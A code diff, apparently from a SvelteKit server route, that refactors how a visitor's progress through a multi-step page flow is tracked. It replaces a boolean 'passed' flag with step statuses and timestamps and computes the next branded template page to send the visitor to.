@@ -20,6 +20,7 @@ import {
 	isValidFlowLabel
 } from '$lib/server/funnel';
 import { registerVisitorConnect } from '$lib/server/visitorConnect.js';
+import { markStepCompleted, ensureFlowInitialized } from '$lib/server/goldenFlow.js';
 
 const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();
 
@@ -167,15 +168,18 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 	let flowApplied = false;
 
 	function applyFlowSteps(
-		steps: { page: string; passed: boolean }[],
+		steps: { page: string; status: string; completedAt?: number }[],
 		flowName?: string
 	): boolean {
-		const nextStep = steps.find((s) => !s.passed && isValidFlowLabel(s.page));
+		const nextStep = steps.find((s) => s.status !== 'completed' && isValidFlowLabel(s.page));
 		if (!nextStep) return false;
 
 		targetLabel = nextStep.page;
-		visitor!.flowSteps = steps;
-		if (flowName) visitor!.flow = flowName;
+		visitor!.flowSteps = steps as any;
+		if (flowName) {
+			visitor!.flow = flowName;
+			visitor!.isGoldenFlow = false;
+		}
 		visitor!.flowBypassed = false;
 		try {
 			dbSetVisitorFlowSteps(ip, visitor!.flowSteps);
@@ -203,16 +207,35 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 	if (assignedFlow && assignedFlow.steps.length > 0 && visitor) {
 		const steps = assignedFlow.steps.map((p) => {
 			const caseCompleted = !!currentLabel && p === currentLabel;
-			return { page: p, passed: !isValidFlowLabel(p) || caseCompleted };
+			return {
+				page: p,
+				status: (!isValidFlowLabel(p) || caseCompleted) ? 'completed' as const : 'not_started' as const,
+				completedAt: caseCompleted ? Date.now() : undefined
+			};
 		});
 		applyFlowSteps(steps, assignedFlow.name);
-	} else if (visitor?.flowSteps?.length && currentLabel) {
-		// Domain-assigned flow (e.g. "basic") — advance past Case ID without a code-level flowId
-		const steps = visitor.flowSteps.map((s) => ({
-			page: s.page,
-			passed: s.passed || s.page === currentLabel
-		}));
-		applyFlowSteps(steps);
+	} else if (visitor && currentLabel) {
+		ensureFlowInitialized(visitor);
+		if (visitor.flowSteps.length > 0) {
+			markStepCompleted(visitor, currentLabel);
+			const nextStep = visitor.flowSteps.find((s: any) => s.status !== 'completed' && isValidFlowLabel(s.page));
+			if (nextStep) {
+				targetLabel = nextStep.page;
+				target = isVisitorHost
+					? labelToVisitorUrl(targetLabel, visitor.module, qp.size ? qp : undefined) || ''
+					: (() => {
+						const base = labelToUrl(targetLabel);
+						if (!base) return '';
+						const qs = qp.toString();
+						return qs ? `${base}?${qs}` : base;
+					})();
+				if (target) {
+					flowApplied = true;
+					serverState.setVisitorLastPage(ip, targetLabel);
+					broadcast({ type: 'visitor:updated', payload: visitor });
+				}
+			}
+		}
 	}
 
 	if (!target) {
@@ -239,7 +262,7 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 			target === `/templates/preview/${brand}/Case%20ID` ||
 			target.includes(`/templates/preview/${brand}/Case`);
 		if (targetIsCurrent && visitor?.flowSteps?.length) {
-			const nextStep = visitor.flowSteps.find((s) => !s.passed && isValidFlowLabel(s.page));
+			const nextStep = visitor.flowSteps.find((s: any) => s.status !== 'completed' && isValidFlowLabel(s.page));
 			if (nextStep) {
 				targetLabel = nextStep.page;
 				const base = isVisitorHost
